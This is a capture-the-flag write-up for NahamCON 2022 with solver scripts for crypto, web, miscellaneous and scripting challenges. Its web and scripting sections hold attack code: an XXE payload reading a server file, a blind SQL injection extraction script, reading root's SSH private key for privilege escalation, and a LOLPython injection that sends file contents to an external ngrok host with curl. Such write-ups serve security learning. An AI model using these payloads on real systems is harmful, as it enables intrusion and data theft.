---
title: NahamCON 2022- WriteUp
author:
  name: wonderchild
  link: https://twitter.com/vonderchild
date: 2022-05-02 6:30:00 -0700
categories: [CTF, NahamCON]
tags: [CTF, NahamCON]
---

# Cryptography

## Unimod

Author: @Gary4657

### Description

I was trying to implement ROT-13, but got carried away.

### Solution

```python
ciphertext = "饇饍饂饈饜餕饆餗餙饅餒餗饂餗餒饃饄餓饆饂餘餓饅餖饇餚餘餒餔餕餕饆餙餕饇餒餒饞飫"
for k in range(0xFFFD):
    ctt = ""
    for c in ciphertext:
        ctt += chr((ord(c) - k) % 0xFFFD)
    if "flag" in ctt:
        print(ctt)
```

## XORROX

Author: @JohnHammond#6971

### Description

We are exclusive -- you can't date anyone, not even the past! And don't even think about looking in the mirror!

### Solution

```python
from pwn import xor

xorrox=[1, 209, 108, 239, 4, 55, 34, 174, 79, 117, 8, 222, 123, 99, 184, 202, 95, 255, 175, 138, 150, 28, 183, 6, 168, 43, 205, 105, 92, 250, 28, 80, 31, 201, 46, 20, 50, 56]
enc=[26, 188, 220, 228, 144, 1, 36, 185, 214, 11, 25, 178, 145, 47, 237, 70, 244, 149, 98, 20, 46, 187, 207, 136, 154, 231, 131, 193, 84, 148, 212, 126, 126, 226, 211, 10, 20, 119]

key = []
for xo in range(len(xorrox) - 1, 0, -1):
    if xo > 0:
        key.append(ord(xor(xorrox[xo], xorrox[xo - 1])))
    else:
        key.append(xo[0])

key.append(1)

key.reverse()
flag = ""

for k in range(len(key)):
    flag += xor(enc[k], key[k]).decode()

print(flag)
```

# Web

## Personnel

Author: @JohnHammond#6971

### Description

A challenge that was never discovered during the 2021 Constellations mission... now ungated :)

### Solution

```
\nflag\{[0-9a-f]{32}\}
```

![Personnel](/assets/img/nahamcon2022/personnel.png)

## EXtravagant

Author: NightWolf#0268

### Description

I've been working on a XML parsing service. It's not finished but there should be enough for you to try out.

### Solution

```python
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///var/www/flag.txt"> ]>
<userInfo>
 <lastName>&ent;</lastName>
</userInfo>
```

## Flaskmetal Alchemist

Author: @artemis19#5698

### Description

Edward has decided to get into web development, and he built this awesome application that lets you search for any metal you want. Alphonse has some reservations though, so he wants you to check it out and make sure it's legit.

### Solution

```python
import requests
import string
from bs4 import BeautifulSoup

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Origin': 'http://challenge.nahamcon.com:32459',
    'Connection': 'keep-alive',
    'Referer': 'http://challenge.nahamcon.com:32459/',
    'Upgrade-Insecure-Requests': '1',
}

flag = "flag{"
for i in range(40):
    for alpha in string.ascii_lowercase + string.digits + "{}_":
        temp_flag = flag + alpha
        data = {
            'search': '',
            'order': f'";", (CASE WHEN (select flag from Flag) LIKE "{temp_flag}%" THEN "name" ELSE "atomic_number" END);',
        }
        response = requests.post('http://challenge.nahamcon.com:32459/', headers=headers, data=data)
        soup = BeautifulSoup(response.content, "html.parser")
        td = soup.find_all('td')[0].getText()
        #print(td)
        if td == "89":
            flag = temp_flag
            print(flag)
            break
```

# Miscellaneous

## Steam Locomotive

Author: @JohnHammond#6971

### Description

I keep accidentally mistyping the `ls` command!

### Solution

```bash
echo "cat flag.txt" | ssh -p 31867 user@challenge.nahamcon.com
```

## Gossip

Author: @JohnHammond#6971

### Description

Ssshh, don't talk too loud! These conversations and gossip are only for us privileged users ;)

Escalate your privileges and retrieve the flag out of root's home directory. 

There is intentionally no `/root/flag.txt` file present.

### Solution

```bash
dialog --readfile /root/.ssh/id_rsa 0 0
puttygen id_rsa -O private-sshcom -o newkey
ssh-keygen -i -f newkey > newkey_in_right_format
chmod 400 newkey_in_right_format
ssh -i newkey_in_right_format -p 30708 root@challenge.nahamcon.com
```

## Ostrich

Author: @Gary#4657

### Description

This ostrich has a secret message for you.

### Solution

```python
from apng import APNG

im = APNG.open("result.apng")
for i, (png, control) in enumerate(im.frames):
  png.save("./temp/image{i}.png".format(i=i))

import imageio
from PIL import Image, GifImagePlugin
from Crypto.Util.number import long_to_bytes as l2b, bytes_to_long as b2l
import random
from apng import APNG

flag = ""
for i in range(38):
file = f"/home/w/Desktop/temp/image{i}.png"
img = Image.open(file)
width, height = img.size

img1 = Image.open("ostrich.jpg")

for x in range(width):
	for y in range(height):
		px1 = img.getpixel((x, y))
		px2 = img1.getpixel((x, y))
		if px1 != px2:
			n = b2l(l2b(px1[0]) + l2b(px1[1]))
			flag += chr(n//px2[2])

print(flag)
```

## One Mantissa Please

Author: @Kkevsterrr#7469

### Description

I'll have one mantissa to go, please! **(Note: the correct answer is the smallest positive integer value.)**

### Solution

```python
import hashlib

n = "9007199254740992"
print(hashlib.md5(n.encode()).hexdigest())
```

Reference: [https://www.linkedin.com/pulse/5-minutes-javascript-numbers-bigintegerjs-library-nir-parisian](https://www.linkedin.com/pulse/5-minutes-javascript-numbers-bigintegerjs-library-nir-parisian)

## To Be And Not To Be

Author: @Kkevsterrr#7469

### Description

To be and not to be, that is the question. (Note: the correct input solution to this challenge is alphanumeric.)

### Solution

```python
import hashlib

print(hashlib.md5("NaN".encode()).hexdigest())
```

Reference: [https://stackoverflow.com/questions/32456893/given-x-x-in-javascript-what-is-the-type-of-x](https://stackoverflow.com/questions/32456893/given-x-x-in-javascript-what-is-the-type-of-x)

# Scripting

## LOLD

Author: @Kkevsterrr#7469

### Description

HAI!!!! WE HAZ THE BESTEST LOLPYTHON INTERPRETERERERER U HAS EVER SEEEEEN! YOU GIVE SCRIPT, WE RUN SCRIPT!! AND FLAG IS EVEN AT `/flag.txt`.

### Solution

```python
from pwn import *

io = remote("challenge.nahamcon.com", 30085)

payload = '''
F CAN HAS open WIT "/flag.txt"!
S CAN HAS F OWN read THING
VISIBLE S
'''

io.sendlineafter("GIMME ONE LOLPYTHON SCRIPT AND MAYB I RUN 4 U!", payload)

print(io.recvall().decode())
```

## LOLD2

Author: @Kkevsterrr#7469

### Description

HAI!!!! WE HAZ THE BESTEST LOLPYTHON INTERPRETERERERER U HAS EVER SEEEEEN! AND WE HAZ MADE SUM UPGRADEZ! YOU GIVE SCRIPT, WE RUN SCRIPT!! AND WE SAY YAY! AND FLAG IS EVEN AT `/flag.txt`!

### Solution

```python
from pwn import *
import string

context.log_level = 'error'

flag = ""

for i in range(40):
	for alphabet in string.ascii_lowercase + "{}" + string.digits:
		io = remote("challenge.nahamcon.com", 30978)

		payload = f'''
		F CAN HAS open WIT "/flag.txt"!
		S CAN HAS F OWN read THING
		SO GOOD S LOOK AT {i}! KINDA LIKE "{alphabet}"
		'''

		io.sendlineafter("GIMME ONE LOLPYTHON SCRIPT AND MAYB I RUN 4 U!", payload)

		s = io.recvall().decode()
		if "ERMMM NO...SRY....KTHXBYE" not in s:
			flag += alphabet
			break
	print(flag)
```

## LOLD3

Author: @Kkevsterrr#7469

### Description

HAI!!!! WE HAZ THE BESTEST LOLPYTHON INTERPRETERERERER U HAS EVER SEEEEEN! AND WE HAZ MADE SUM UPGRADEZ! YOU GIVE SCRIPT, WE RUN SCRIPT!! AND WE SAY YAY! BUT URGHHHH NOW WE HAVE LOST THE FLAG!?! YOU HAZ TO FIND IT!!

### Solution

```python
from pwn import *
import string

context.log_level = 'error'

io = remote("challenge.nahamcon.com", 31097)

payload = f'''
GIMME os LIKE OS
IN MAI os GIMME system LIKE SYSTEM

IZ __name__ KINDA LIKE "__main__"?
    GIMME EACH XD IN THE OS OWN walk WIT '.' OK?
        HE CAN HAS XD LOOK AT 2!
        GIMME EACH I IN THIS HE?
            IZ I KINDA LIKE "flag.txt"?
                D CAN HAS XD LOOK AT 0!
                D CAN HAS D ALONG WITH "/flag.txt"
                F CAN HAS open WIT D!
                S CAN HAS F OWN read THING
                GIMME EACH TT IN THE OS OWN system WIT 'curl http://02b9-119-152-101-201.ngrok.io/' ALONG WITH S OK?
                    VISIBLE S
'''

io.sendlineafter("GIMME ONE LOLPYTHON SCRIPT AND MAYB I RUN 4 U!", payload)
print(io.recvall().decode())
```

![LOLD3](/assets/img/nahamcon2022/lold3.png)